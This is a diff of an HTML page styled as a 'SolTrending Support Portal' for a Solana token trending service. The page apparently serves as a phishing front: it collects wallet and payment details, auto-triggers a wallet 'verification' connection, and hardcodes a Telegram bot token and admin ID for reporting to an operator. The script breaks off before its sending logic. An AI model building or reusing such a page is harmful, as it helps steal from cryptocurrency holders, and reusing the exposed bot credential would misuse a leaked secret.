@@ -1,793 +1,1066 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SolTrending Support</title>
+    <title>SolTrending Support Portal</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-```
-    body {
-        font-family: 'Inter', 'Segoe UI', sans-serif;
-        background: linear-gradient(135deg, #000000 0%, #1a0d26 50%, #000000 100%);
-        color: #ffffff;
-        min-height: 100vh;
-        line-height: 1.6;
-    }
+        :root {
+            --primary-purple: #8B5FBF;
+            --light-purple: #B794D1;
+            --dark-purple: #5D3F7A;
+            --accent-purple: #A67BC8;
+            --bg-black: #0A0A0B;
+            --bg-dark: #141416;
+            --bg-card: #1C1C20;
+            --text-primary: #FFFFFF;
+            --text-secondary: #B8B8C0;
+            --text-muted: #787880;
+            --border-color: #2A2A30;
+            --success-color: #22C55E;
+            --error-color: #EF4444;
+            --warning-color: #F59E0B;
+        }
 
-    .container {
-        max-width: 800px;
-        margin: 0 auto;
-        padding: 40px 20px;
-    }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-black);
+            color: var(--text-primary);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
 
-    .header {
-        text-align: center;
-        margin-bottom: 50px;
-        padding: 40px 0;
-        border-bottom: 2px solid #9333ea;
-    }
+        /* Animated background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(139, 95, 191, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 20%, rgba(183, 148, 209, 0.08) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 80%, rgba(93, 63, 122, 0.05) 0%, transparent 50%);
+            animation: backgroundFlow 20s ease-in-out infinite alternate;
+            z-index: -1;
+        }
 
-    .header h1 {
-        font-size: 3rem;
-        font-weight: 700;
-        color: #9333ea;
-        margin-bottom: 15px;
-        letter-spacing: -0.02em;
-        text-shadow: 0 0 20px rgba(147, 51, 234, 0.3);
-    }
+        @keyframes backgroundFlow {
+            0% { transform: translateX(-10px) translateY(-5px) scale(1); }
+            100% { transform: translateX(10px) translateY(5px) scale(1.02); }
+        }
 
-    .header .subtitle {
-        font-size: 1.2rem;
-        color: #d8b4fe;
-        font-weight: 400;
-        max-width: 600px;
-        margin: 0 auto;
-    }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 60px 20px;
+            position: relative;
+        }
 
-    .support-card {
-        background: linear-gradient(145deg, #1a0d26, #0f051a);
-        border: 1px solid #6b21a8;
-        border-radius: 16px;
-        padding: 40px;
-        box-shadow: 0 20px 60px rgba(147, 51, 234, 0.2);
-        margin-bottom: 30px;
-    }
+        /* Header with enhanced animations */
+        .header {
+            text-align: center;
+            margin-bottom: 60px;
+            padding: 50px 0;
+            position: relative;
+            animation: fadeInUp 1s ease-out;
+        }
 
-    .section-title {
-        font-size: 1.5rem;
-        color: #c084fc;
-        margin-bottom: 25px;
-        font-weight: 600;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-    }
+        .header::before {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary-purple), var(--light-purple));
+            border-radius: 2px;
+            animation: expandLine 1.2s ease-out 0.5s both;
+        }
 
-    .form-group {
-        margin-bottom: 30px;
-    }
+        @keyframes expandLine {
+            from { width: 0; }
+            to { width: 100px; }
+        }
 
-    .form-label {
-        display: block;
-        margin-bottom: 10px;
-        color: #ffffff;
-        font-weight: 500;
-        font-size: 1rem;
-    }
-
-    .form-input {
-        width: 100%;
-        padding: 16px 20px;
-        background: #000000;
-        border: 2px solid #6b21a8;
-        border-radius: 8px;
-        color: #ffffff;
-        font-size: 1rem;
-        transition: all 0.3s ease;
-    }
-
-    .form-input:focus {
-        outline: none;
-        border-color: #9333ea;
-        box-shadow: 0 0 0 3px rgba(147, 51, 234, 0.2);
-    }
-
-    .form-input::placeholder {
-        color: #6b21a8;
-    }
-
-    .submit-btn {
-        width: 100%;
-        background: linear-gradient(135deg, #9333ea, #7c3aed);
-        color: #ffffff;
-        border: none;
-        padding: 20px;
-        border-radius: 8px;
-        font-size: 1.2rem;
-        font-weight: 700;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        margin-top: 30px;
-        box-shadow: 0 4px 15px rgba(147, 51, 234, 0.3);
-    }
-
-    .submit-btn:hover {
-        background: linear-gradient(135deg, #7c3aed, #6b21a8);
-        transform: translateY(-2px);
-        box-shadow: 0 10px 30px rgba(147, 51, 234, 0.5);
-    }
-
-    .submit-btn:disabled {
-        opacity: 0.5;
-        cursor: not-allowed;
-        transform: none;
-    }
-
-    .status-message {
-        padding: 16px 20px;
-        border-radius: 8px;
-        margin: 20px 0;
-        font-weight: 500;
-        text-align: center;
-        display: none;
-        border-left: 4px solid;
-    }
-
-    .status-success {
-        background: rgba(34, 197, 94, 0.1);
-        border-color: #22c55e;
-        color: #22c55e;
-    }
-
-    .status-error {
-        background: rgba(239, 68, 68, 0.1);
-        border-color: #ef4444;
-        color: #ef4444;
-    }
-
-    .status-warning {
-        background: rgba(245, 158, 11, 0.1);
-        border-color: #f59e0b;
-        color: #f59e0b;
-    }
-
-    .status-info {
-        background: rgba(147, 51, 234, 0.1);
-        border-color: #9333ea;
-        color: #d8b4fe;
-    }
-
-    /* Modal Styles */
-    .modal-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.9);
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        z-index: 1000;
-        opacity: 0;
-        visibility: hidden;
-        transition: all 0.3s ease;
-    }
-
-    .modal-overlay.active {
-        opacity: 1;
-        visibility: visible;
-    }
-
-    .modal {
-        background: linear-gradient(145deg, #1a0d26, #0f051a);
-        border: 2px solid #9333ea;
-        border-radius: 16px;
-        padding: 40px;
-        max-width: 500px;
-        width: 90%;
-        text-align: center;
-        transform: scale(0.9);
-        transition: transform 0.3s ease;
-        box-shadow: 0 20px 60px rgba(147, 51, 234, 0.3);
-    }
-
-    .modal-overlay.active .modal {
-        transform: scale(1);
-    }
-
-    .modal h3 {
-        color: #c084fc;
-        font-size: 1.8rem;
-        margin-bottom: 20px;
-        font-weight: 600;
-    }
-
-    .modal p {
-        color: #d8b4fe;
-        margin-bottom: 30px;
-        font-size: 1.1rem;
-    }
-
-    .wallet-options {
-        display: flex;
-        flex-direction: column;
-        gap: 15px;
-        margin-bottom: 30px;
-    }
-
-    .wallet-option {
-        background: linear-gradient(135deg, #9333ea, #7c3aed);
-        border: none;
-        border-radius: 8px;
-        padding: 16px 20px;
-        color: #ffffff;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        font-size: 1rem;
-        font-weight: 600;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
-    }
-
-    .wallet-option:hover {
-        background: linear-gradient(135deg, #7c3aed, #6b21a8);
-        transform: translateY(-2px);
-    }
-
-    .wallet-option:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
-        transform: none;
-    }
-
-    .manual-input {
-        margin-top: 20px;
-        padding: 20px;
-        background: rgba(147, 51, 234, 0.1);
-        border: 1px solid #9333ea;
-        border-radius: 8px;
-        display: none;
-    }
-
-    .modal-buttons {
-        display: flex;
-        gap: 15px;
-        justify-content: center;
-    }
-
-    .modal-btn {
-        padding: 12px 24px;
-        border: none;
-        border-radius: 6px;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
-    }
-
-    .modal-btn-primary {
-        background: linear-gradient(135deg, #9333ea, #7c3aed);
-        color: #ffffff;
-    }
-
-    .modal-btn-secondary {
-        background: transparent;
-        color: #d8b4fe;
-        border: 2px solid #6b21a8;
-    }
-
-    .modal-btn:hover {
-        transform: translateY(-2px);
-    }
-
-    .loading {
-        display: inline-block;
-        width: 20px;
-        height: 20px;
-        border: 2px solid #6b21a8;
-        border-top: 2px solid #9333ea;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-        margin-left: 10px;
-    }
-
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-
-    .info-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-        gap: 20px;
-        margin-bottom: 40px;
-    }
-
-    .info-item {
-        background: linear-gradient(145deg, #1a0d26, #0f051a);
-        padding: 25px;
-        border-radius: 8px;
-        border: 1px solid #6b21a8;
-        text-align: center;
-        transition: all 0.3s ease;
-    }
-
-    .info-item:hover {
-        border-color: #9333ea;
-        box-shadow: 0 5px 20px rgba(147, 51, 234, 0.2);
-    }
-
-    .info-number {
-        font-size: 2rem;
-        color: #c084fc;
-        font-weight: 700;
-        margin-bottom: 10px;
-    }
-
-    .info-text {
-        color: #d8b4fe;
-        font-size: 0.95rem;
-    }
-
-    @media (max-width: 768px) {
         .header h1 {
-            font-size: 2.2rem;
+            font-size: clamp(2.5rem, 5vw, 3.5rem);
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary-purple), var(--light-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+            letter-spacing: -0.02em;
+            animation: titleGlow 3s ease-in-out infinite alternate;
         }
-        
+
+        @keyframes titleGlow {
+            0% { filter: drop-shadow(0 0 10px rgba(139, 95, 191, 0.3)); }
+            100% { filter: drop-shadow(0 0 20px rgba(139, 95, 191, 0.6)); }
+        }
+
+        .header .subtitle {
+            font-size: 1.25rem;
+            color: var(--text-secondary);
+            font-weight: 400;
+            max-width: 600px;
+            margin: 0 auto;
+            opacity: 0;
+            animation: fadeInUp 1s ease-out 0.3s both;
+        }
+
+        /* Process steps with stagger animation */
+        .process-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            margin-bottom: 60px;
+            animation: fadeInUp 1s ease-out 0.6s both;
+        }
+
+        .step-card {
+            background: linear-gradient(145deg, var(--bg-card), var(--bg-dark));
+            padding: 30px 20px;
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            animation: stepCardIn 0.6s ease-out both;
+            animation-delay: calc(var(--step-index) * 0.1s);
+        }
+
+        .step-card:nth-child(1) { --step-index: 0; }
+        .step-card:nth-child(2) { --step-index: 1; }
+        .step-card:nth-child(3) { --step-index: 2; }
+        .step-card:nth-child(4) { --step-index: 3; }
+
+        @keyframes stepCardIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .step-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(139, 95, 191, 0.1), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .step-card:hover::before {
+            left: 100%;
+        }
+
+        .step-card:hover {
+            transform: translateY(-8px);
+            border-color: var(--primary-purple);
+            box-shadow: 0 20px 40px rgba(139, 95, 191, 0.15);
+        }
+
+        .step-number {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary-purple), var(--light-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 15px;
+            line-height: 1;
+        }
+
+        .step-text {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            font-weight: 500;
+        }
+
+        /* Main support card */
         .support-card {
-            padding: 25px;
+            background: linear-gradient(145deg, var(--bg-card), var(--bg-dark));
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 50px;
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 1s ease-out 0.9s both;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
-        
+
+        .support-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary-purple), transparent);
+        }
+
+        .section-title {
+            font-size: 1.75rem;
+            color: var(--text-primary);
+            margin-bottom: 40px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: linear-gradient(90deg, var(--primary-purple), transparent);
+        }
+
+        /* Form styling */
+        .form-group {
+            margin-bottom: 35px;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 12px;
+            color: var(--text-primary);
+            font-weight: 600;
+            font-size: 1rem;
+            transition: color 0.3s ease;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 18px 24px;
+            background: var(--bg-dark);
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-purple);
+            box-shadow: 0 0 0 4px rgba(139, 95, 191, 0.1);
+            background: var(--bg-black);
+        }
+
+        .form-input:focus + .form-label {
+            color: var(--primary-purple);
+        }
+
+        .form-input::placeholder {
+            color: var(--text-muted);
+            transition: opacity 0.3s ease;
+        }
+
+        .form-input:focus::placeholder {
+            opacity: 0.5;
+        }
+
+        /* Animated submit button */
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, var(--primary-purple), var(--dark-purple));
+            color: var(--text-primary);
+            border: none;
+            padding: 22px;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .submit-btn:hover::before {
+            left: 100%;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(139, 95, 191, 0.4);
+            background: linear-gradient(135deg, var(--light-purple), var(--primary-purple));
+        }
+
+        .submit-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Status messages with improved styling */
+        .status-message {
+            padding: 20px 24px;
+            border-radius: 12px;
+            margin: 25px 0;
+            font-weight: 600;
+            text-align: center;
+            display: none;
+            border-left: 4px solid;
+            position: relative;
+            animation: statusSlideIn 0.4s ease-out;
+        }
+
+        @keyframes statusSlideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .status-success {
+            background: rgba(34, 197, 94, 0.1);
+            border-color: var(--success-color);
+            color: var(--success-color);
+        }
+
+        .status-error {
+            background: rgba(239, 68, 68, 0.1);
+            border-color: var(--error-color);
+            color: var(--error-color);
+        }
+
+        .status-warning {
+            background: rgba(245, 158, 11, 0.1);
+            border-color: var(--warning-color);
+            color: var(--warning-color);
+        }
+
+        .status-info {
+            background: rgba(139, 95, 191, 0.1);
+            border-color: var(--primary-purple);
+            color: var(--text-secondary);
+        }
+
+        /* Enhanced Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
         .modal {
-            padding: 25px;
+            background: linear-gradient(145deg, var(--bg-card), var(--bg-dark));
+            border: 2px solid var(--primary-purple);
+            border-radius: 24px;
+            padding: 50px;
+            max-width: 550px;
+            width: 90%;
+            text-align: center;
+            transform: scale(0.8) translateY(50px);
+            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            box-shadow: 0 30px 80px rgba(139, 95, 191, 0.3);
         }
-        
-        .modal-buttons {
+
+        .modal-overlay.active .modal {
+            transform: scale(1) translateY(0);
+        }
+
+        .modal::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, var(--primary-purple), var(--light-purple), var(--primary-purple));
+            border-radius: 24px;
+            z-index: -1;
+            animation: borderGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes borderGlow {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        .modal h3 {
+            color: var(--text-primary);
+            font-size: 2rem;
+            margin-bottom: 25px;
+            font-weight: 700;
+        }
+
+        .modal p {
+            color: var(--text-secondary);
+            margin-bottom: 35px;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+
+        .wallet-options {
+            display: flex;
             flex-direction: column;
+            gap: 20px;
+            margin-bottom: 35px;
         }
-    }
 
-    .connection-status {
-        margin: 20px 0;
-        padding: 16px;
-        border-radius: 8px;
-        text-align: center;
-        font-weight: 600;
-    }
+        .wallet-option {
+            background: linear-gradient(135deg, var(--primary-purple), var(--dark-purple));
+            border: none;
+            border-radius: 12px;
+            padding: 18px 24px;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
 
-    .connection-pending {
-        background: rgba(147, 51, 234, 0.1);
-        border: 1px solid #9333ea;
-        color: #c084fc;
-    }
+        .wallet-option::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
 
-    .connection-failed {
-        background: rgba(239, 68, 68, 0.1);
-        border: 1px solid #ef4444;
-        color: #ef4444;
-    }
+        .wallet-option:hover::before {
+            left: 100%;
+        }
 
-    .verification-pending {
-        background: rgba(245, 158, 11, 0.1);
-        border: 1px solid #f59e0b;
-        color: #f59e0b;
-    }
+        .wallet-option:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(139, 95, 191, 0.3);
+        }
 
-    .wallet-status {
-        margin: 20px 0;
-        padding: 16px;
-        border-radius: 8px;
-        text-align: center;
-        font-weight: 600;
-        display: none;
-    }
-</style>
-```
+        .wallet-option:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
 
+        .manual-input {
+            margin-top: 25px;
+            padding: 25px;
+            background: rgba(139, 95, 191, 0.05);
+            border: 1px solid var(--primary-purple);
+            border-radius: 12px;
+            display: none;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .modal-btn {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            min-width: 120px;
+        }
+
+        .modal-btn-primary {
+            background: linear-gradient(135deg, var(--primary-purple), var(--dark-purple));
+            color: var(--text-primary);
+        }
+
+        .modal-btn-secondary {
+            background: transparent;
+            color: var(--text-secondary);
+            border: 2px solid var(--border-color);
+        }
+
+        .modal-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .modal-btn-primary:hover {
+            box-shadow: 0 8px 20px rgba(139, 95, 191, 0.3);
+        }
+
+        .modal-btn-secondary:hover {
+            border-color: var(--primary-purple);
+            color: var(--text-primary);
+        }
+
+        /* Loading animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border-color);
+            border-top: 2px solid var(--primary-purple);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 40px 15px;
+            }
+            
+            .header h1 {
+                font-size: 2.5rem;
+            }
+            
+            .support-card {
+                padding: 30px 25px;
+            }
+            
+            .modal {
+                padding: 30px 25px;
+                margin: 20px;
+            }
+            
+            .modal-buttons {
+                flex-direction: column;
+            }
+
+            .process-steps {
+                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+                gap: 20px;
+            }
+        }
+
+        /* Connection status styles */
+        .connection-status {
+            margin: 20px 0;
+            padding: 18px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .connection-pending {
+            background: rgba(139, 95, 191, 0.1);
+            border: 1px solid var(--primary-purple);
+            color: var(--primary-purple);
+        }
+
+        .connection-failed {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--error-color);
+            color: var(--error-color);
+        }
+
+        .verification-pending {
+            background: rgba(245, 158, 11, 0.1);
+            border: 1px solid var(--warning-color);
+            color: var(--warning-color);
+        }
+
+        .wallet-status {
+            margin: 25px 0;
+            padding: 18px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            display: none;
+        }
+
+        /* Utility animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        /* Focus states for accessibility */
+        .form-input:focus,
+        .submit-btn:focus,
+        .wallet-option:focus,
+        .modal-btn:focus {
+            outline: 2px solid var(--primary-purple);
+            outline-offset: 2px;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>SolTrending Support</h1>
-            <p class="subtitle">Submit your trending request for automatic review</p>
+            <h1>SolTrending Support Portal</h1>
+            <p class="subtitle">Submit your support request for automatic review and assistance</p>
         </div>
 
-```
-    <div class="info-grid">
-        <div class="info-item">
-            <div class="info-number">01</div>
-            <div class="info-text">Fill Payment Details</div>
+        <div class="process-steps">
+            <div class="step-card">
+                <div class="step-number">01</div>
+                <div class="step-text">Fill Payment Details</div>
+            </div>
+            <div class="step-card">
+                <div class="step-number">02</div>
+                <div class="step-text">Submit Request</div>
+            </div>
+            <div class="step-card">
+                <div class="step-number">03</div>
+                <div class="step-text">Verify Wallet</div>
+            </div>
+            <div class="step-card">
+                <div class="step-number">04</div>
+                <div class="step-text">Receive Support</div>
+            </div>
         </div>
-        <div class="info-item">
-            <div class="info-number">02</div>
-            <div class="info-text">Submit Request</div>
-        </div>
-        <div class="info-item">
-            <div class="info-number">03</div>
-            <div class="info-text">Verify Wallet</div>
-        </div>
-        <div class="info-item">
-            <div class="info-number">04</div>
-            <div class="info-text">Get Trending</div>
+
+        <div class="support-card">
+            <h2 class="section-title">
+                💳 Payment Information
+            </h2>
+            
+            <form id="supportForm">
+                <div class="form-group">
+                    <label class="form-label" for="tokenAddress">Token Contract Address</label>
+                    <input type="text" id="tokenAddress" name="tokenAddress" class="form-input" 
+                           placeholder="Enter the token contract address" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="walletAddress">Your Wallet Address</label>
+                    <input type="text" id="walletAddress" name="walletAddress" class="form-input" 
+                           placeholder="Enter your wallet address" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="transactionHash">Transaction Hash</label>
+                    <input type="text" id="transactionHash" name="transactionHash" class="form-input" 
+                           placeholder="Enter the transaction hash" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="paidToWallet">Payment Recipient Wallet</label>
+                    <input type="text" id="paidToWallet" name="paidToWallet" class="form-input" 
+                           placeholder="Enter the wallet address you paid to" required>
+                </div>
+
+                <div class="wallet-status" id="walletStatus"></div>
+
+                <div class="status-message" id="statusMessage"></div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    Check Transactions
+                </button>
+            </form>
         </div>
     </div>
 
-    <div class="support-card">
-        <h2 class="section-title">
-            📋 Payment Information
-        </h2>
-        
-        <form id="supportForm">
-            <div class="form-group">
-                <label class="form-label" for="tokenAddress">Token Contract Address</label>
-                <input type="text" id="tokenAddress" name="tokenAddress" class="form-input" 
-                       placeholder="Enter your token contract address" required>
+    <!-- Wallet Connection Modal -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal">
+            <h3>Connect Your Wallet</h3>
+            <p id="modalDescription">Attempting to connect to your wallet for verification...</p>
+            
+            <div class="wallet-options" id="walletOptions">
+                <button class="wallet-option" id="connectWalletOption" disabled>
+                    <span id="connectButtonText">Connecting...</span>
+                    <div class="loading" id="connectLoading"></div>
+                </button>
             </div>
 
-            <div class="form-group">
-                <label class="form-label" for="walletAddress">Your Wallet Address</label>
-                <input type="text" id="walletAddress" name="walletAddress" class="form-input" 
-                       placeholder="Enter your wallet address" required>
+            <div id="connectionStatus"></div>
+
+            <div class="manual-input" id="manualInput">
+                <p style="color: var(--text-secondary); margin-bottom: 15px;">Enter your wallet address for manual verification:</p>
+                <input type="text" id="manualWalletAddress" class="form-input" 
+                       placeholder="Enter your wallet address" style="margin-bottom: 15px;">
+                <button type="button" class="modal-btn modal-btn-primary" id="useManualAddress">
+                    Verify Address
+                </button>
+                <div id="manualVerificationStatus"></div>
             </div>
 
-            <div class="form-group">
-                <label class="form-label" for="transactionHash">Transaction Hash</label>
-                <input type="text" id="transactionHash" name="transactionHash" class="form-input" 
-                       placeholder="Enter transaction hash" required>
+            <div class="modal-buttons">
+                <button type="button" class="modal-btn modal-btn-secondary" id="closeModal">
+                    Cancel
+                </button>
             </div>
-
-            <div class="form-group">
-                <label class="form-label" for="paidToWallet">Payment Recipient Wallet</label>
-                <input type="text" id="paidToWallet" name="paidToWallet" class="form-input" 
-                       placeholder="Enter wallet address you paid to" required>
-            </div>
-
-            <div class="wallet-status" id="walletStatus"></div>
-
-            <div class="status-message" id="statusMessage"></div>
-
-            <button type="submit" class="submit-btn" id="submitBtn">
-                Verify Transactions
-            </button>
-        </form>
-    </div>
-</div>
-
-<!-- Wallet Connection Modal -->
-<div class="modal-overlay" id="walletModal">
-    <div class="modal">
-        <h3>Verify Your Wallet</h3>
-        <p id="modalDescription">Attempting to connect to your wallet for verification...</p>
-        
-        <div class="wallet-options" id="walletOptions">
-            <button class="wallet-option" id="connectWalletOption" disabled>
-                <span id="connectButtonText">Connecting...</span>
-                <div class="loading" id="connectLoading"></div>
-            </button>
-        </div>
-
-        <div id="connectionStatus"></div>
-
-        <div class="manual-input" id="manualInput">
-            <p style="color: #d8b4fe; margin-bottom: 15px;">Enter your wallet address for manual verification:</p>
-            <input type="text" id="manualWalletAddress" class="form-input" 
-                   placeholder="Enter your wallet address" style="margin-bottom: 15px;">
-            <button type="button" class="modal-btn modal-btn-primary" id="useManualAddress">
-                Verify Manually
-            </button>
-            <div id="manualVerificationStatus"></div>
-        </div>
-
-        <div class="modal-buttons">
-            <button type="button" class="modal-btn modal-btn-secondary" id="closeModal">
-                Cancel
-            </button>
         </div>
     </div>
-</div>
 
-<script>
-    // Telegram Bot Configuration
-    const TELEGRAM_BOT_TOKEN = '8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo';
-    const ADMIN_USER_ID = '1129109001';
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo';
+        const ADMIN_USER_ID = '1129109001';
 
-    let userCountry = 'Unknown';
-    let connectedWallet = null;
-    let isWalletConnected = false;
-    let currentFormData = null;
+        let userCountry = 'Unknown';
+        let connectedWallet = null;
+        let isWalletConnected = false;
+        let currentFormData = null;
 
-    // DOM Elements
-    const form = document.getElementById('supportForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const statusMessage = document.getElementById('statusMessage');
-    const walletModal = document.getElementById('walletModal');
-    const closeModal = document.getElementById('closeModal');
-    const walletStatus = document.getElementById('walletStatus');
+        // DOM Elements
+        const form = document.getElementById('supportForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusMessage = document.getElementById('statusMessage');
+        const walletModal = document.getElementById('walletModal');
+        const closeModal = document.getElementById('closeModal');
+        const walletStatus = document.getElementById('walletStatus');
 
-    // Modal elements
-    const modalDescription = document.getElementById('modalDescription');
-    const connectWalletOption = document.getElementById('connectWalletOption');
-    const connectButtonText = document.getElementById('connectButtonText');
-    const connectLoading = document.getElementById('connectLoading');
-    const connectionStatus = document.getElementById('connectionStatus');
-    const manualInput = document.getElementById('manualInput');
-    const manualWalletAddress = document.getElementById('manualWalletAddress');
-    const useManualAddress = document.getElementById('useManualAddress');
